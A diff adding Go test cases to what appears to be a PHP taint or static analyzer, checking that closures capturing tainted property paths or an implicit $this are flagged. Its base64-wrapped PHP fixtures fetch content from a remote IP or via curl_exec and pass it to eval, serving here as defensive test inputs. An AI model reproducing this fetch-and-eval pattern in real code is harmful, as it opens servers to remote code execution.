@@ -1114,3 +1114,81 @@ func TestCaptureStopsAtNonArrowScopeBoundary(t *testing.T) {
 		t.Fatalf("precision loss = %v, want closure-capture for a real arrow capture", rep.PrecisionLoss)
 	}
 }
+
+var (
+	fxCapturePropertyPath = b64(`<?php
+$o = new stdClass();
+$o->body = file_get_contents('http://198.51.100.7/x');
+$f = function() use ($o) { eval($o->body); };`)
+
+	fxCaptureThisClosure = b64(`<?php
+class K {
+	private $b;
+	function m($c) { $this->b = curl_exec($c); return function() { eval($this->b); }; }
+}`)
+
+	fxCaptureThisArrow = b64(`<?php
+class K {
+	private $b;
+	function m($c) { $this->b = curl_exec($c); return fn() => eval($this->b); }
+}`)
+
+	fxCapturePropertyClean = b64(`<?php
+$o = new stdClass();
+$o->body = 'local literal';
+$unused = curl_exec($c);
+include __DIR__ . '/parts/header.php';
+$f = function() use ($o) { echo $o->body; };`)
+
+	fxCaptureThisClean = b64(`<?php
+class K {
+	private $b = 'local.php';
+	function m($c) { $unused = curl_exec($c); include $this->b; return function() { echo $this->b; }; }
+}`)
+)
+
+// TestCaptureOfPropertyPathIsRecorded covers the two ways a captured binding
+// can hold taint under a name the capture itself does not spell. Taint on a
+// property is keyed by its whole access path ("o->body"), while what the
+// closure captures is the base variable ($o), so matching capture names against
+// taint keys literally misses it. $this is the sharper case: a non-static
+// closure receives it implicitly, so it never appears in a use() clause at all.
+// Both drop a value the closure really does receive, and this package treats an
+// unrecorded drop as a silent false negative.
+func TestCaptureOfPropertyPathIsRecorded(t *testing.T) {
+	for _, tc := range []struct{ name, fixture string }{
+		{"use clause on a property path", fxCapturePropertyPath},
+		{"implicit $this in a closure", fxCaptureThisClosure},
+		{"implicit $this in an arrow function", fxCaptureThisArrow},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			rep := run(t, tc.fixture)
+			if rep.Status != StatusAnalyzed {
+				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+			}
+			if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
+				t.Fatalf("precision loss = %v, want closure-capture", rep.PrecisionLoss)
+			}
+		})
+	}
+}
+
+// TestCaptureOfCleanPropertyPathIsNotRecorded keeps the widened matching
+// gated. Capturing an object or receiving $this is ordinary in any OO PHP
+// file, so neither may raise a marker on its own account.
+func TestCaptureOfCleanPropertyPathIsNotRecorded(t *testing.T) {
+	for _, tc := range []struct{ name, fixture string }{
+		{"clean property path", fxCapturePropertyClean},
+		{"clean $this", fxCaptureThisClean},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			rep := run(t, tc.fixture)
+			if rep.Status != StatusAnalyzed {
+				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
+			}
+			if slices.Contains(rep.PrecisionLoss, "closure-capture") {
+				t.Fatalf("precision loss = %v, want no closure-capture on a clean capture", rep.PrecisionLoss)
+			}
+		})
+	}
+}
